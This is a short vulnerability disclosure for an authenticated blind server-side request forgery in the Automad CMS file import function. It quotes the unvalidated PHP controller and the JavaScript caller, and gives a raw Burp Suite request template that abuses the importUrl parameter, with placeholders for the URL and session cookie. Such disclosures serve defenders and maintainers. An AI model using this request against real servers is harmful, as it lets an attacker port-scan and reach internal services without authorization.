# Authenticated Blind SSRF

It was discovered that the import function on the `FileController.php` file was not validated the value of the `importUrl` parameter.

```jsx
public static function import() {
		$Response = new Response();
		$Messenger = new Messenger();

		FileModel::import(
			Request::post('importUrl'),
			Request::post('url'),
			$Messenger
		);

		$Response->setError($Messenger->getError());

		return $Response;
	}
```

Import.js

```jsx
$.post(
					'?controller=File::import',
					{ url: url, importUrl: importUrl },
					function (data) {
						if (data.error) {
							Automad.Notify.error(data.error);
						} else {
							$modal.on(
								'hide.uk.modal.automad.import',
								function () {
									$modal.off('automad.import');
									$form.empty().submit();
								}
							);

							UIkit.modal(ai.selectors.modal).hide();
						}
					},
```

This issue allow pentester to perform a port scan against the local environment or abuse some service. The following screenshots show the pentester was able to perform this issue when importing a file from a remote webn server (**`POST /dashboard?controller=File::import`**)

![1](https://github.com/screetsec/VDD/assets/17976841/cea8d602-96d3-49cb-b003-476208430d40)

Burp Suite Requests:

```jsx
POST /dashboard?controller=File::import HTTP/1.1
Host: automad.scr
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 34
Origin: http://automad.scr
Connection: close
Referer: http://automad.scr/dashboard?view=Shared
Cookie: Automad-8d86b702d2bd8d7c568d8600480adaef=[Cookie]

url=&importUrl=$[URL]
```

Server Response:

![2](https://github.com/screetsec/VDD/assets/17976841/e83d1693-2242-4023-b55e-65239742da9b)
